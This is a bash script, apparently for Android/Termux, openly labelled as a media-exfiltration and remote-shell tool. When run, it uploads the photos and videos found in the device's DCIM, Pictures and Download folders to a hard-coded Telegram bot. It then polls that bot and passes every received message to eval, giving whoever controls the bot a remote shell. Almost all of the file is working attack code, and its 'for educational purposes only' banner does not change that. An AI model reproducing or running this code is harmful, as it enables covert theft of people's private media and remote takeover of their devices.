#!/bin/bash
# tool.sh - Auto Media Exfiltration + Shell Access

#-------------------
#   Color Settings
#-------------------
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
RESET="\e[0m"

#-------------------
#   ASCII Art
#-------------------
display_logo() {
    clear
    echo -e "${RED}"
    echo '
██╗  ██╗███████╗███╗   ███╗ █████╗     █████╗ ██╗
██║  ██║██╔════╝████╗ ████║██╔══██╗   ██╔══██╗██║
███████║█████╗  ██╔████╔██║███████║   ███████║██║
██╔══██║██╔══╝  ██║╚██╔╝██║██╔══██║   ██╔══██║██║
██║  ██║███████╗██║ ╚═╝ ██║██║  ██║██╗██║  ██║██║
╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝
    '
    echo -e "${RESET}"
    echo -e "${GREEN}[+] Tool by YourName${RESET}"
    echo -e "${YELLOW}[!] For educational purposes only${RESET}\n"
}

#-------------------
#   Configuration
#-------------------
BOT_TOKEN="7509006316:AAHcVZ9lDY3BBZmm-5RMcMi4vl-k4FqYc0s"
CHAT_ID="5967116314"
MEDIA_DIRS=("/sdcard/DCIM" "/sdcard/Pictures" "/sdcard/Download")
LOG_FILE="/sdcard/tool.log"

#-------------------
#   Telegram API
#-------------------
send_telegram() {
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="$1" >/dev/null
}

send_media() {
    local file="$1"
    local type=$(file --mime-type -b "$file")

    if [[ $type == image/* ]]; then
        curl -s -F chat_id="$CHAT_ID" -F photo=@"$file" "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" >/dev/null
    elif [[ $type == video/* ]]; then
        curl -s -F chat_id="$CHAT_ID" -F video=@"$file" "https://api.telegram.org/bot$BOT_TOKEN/sendVideo" >/dev/null
    else
        send_telegram "⚠️ Unsupported file: $file"
    fi
}

#-------------------
#   Auto Media Exfiltration
#-------------------
auto_exfiltrate() {
    send_telegram "🔍 Starting automatic media exfiltration..."
    local total=0

    for dir in "${MEDIA_DIRS[@]}"; do
        if [ -d "$dir" ]; then
            find "$dir" -type f \( -name "*.jpg" -o -name "*.jpeg" -o -name "*.png" -o -name "*.mp4" \) | while read file; do
                send_media "$file"
                ((total++))
            done
        fi
    done

    send_telegram "✅ Auto-exfiltration complete! Sent $total files"
}

#-------------------
#   Shell Access
#-------------------
interactive_shell() {
    send_telegram "💻 Shell activated. Type 'exit' to quit."
    
    while true; do
        local update=$(curl -s "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=-1")
        local cmd=$(echo "$update" | grep -oP '(?<=text":")[^"]+')

        if [[ "$cmd" == "exit" ]]; then
            send_telegram "❌ Shell terminated"
            break
        elif [[ ! -z "$cmd" ]]; then
            local output=$(eval "$cmd" 2>&1)
            send_telegram "STDOUT:\n$output"
        fi

        sleep 3
    done
}

#-------------------
#   Command Handler
#-------------------
handle_command() {
    case $1 in
        shell)
            interactive_shell
            ;;
        *)
            send_telegram "❌ Invalid command"
            ;;
    esac
}

#-------------------
#   Main Execution
#-------------------
display_logo
auto_exfiltrate

send_telegram "Intialized successfully. Type /shell for remote access"

while true; do
    local update=$(curl -s "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=-1")
    local message=$(echo "$update" | grep -oP '(?<=text":")[^"]+')

    if [ ! -z "$message" ]; then
        handle_command "$message"
    fi

    sleep 5
done
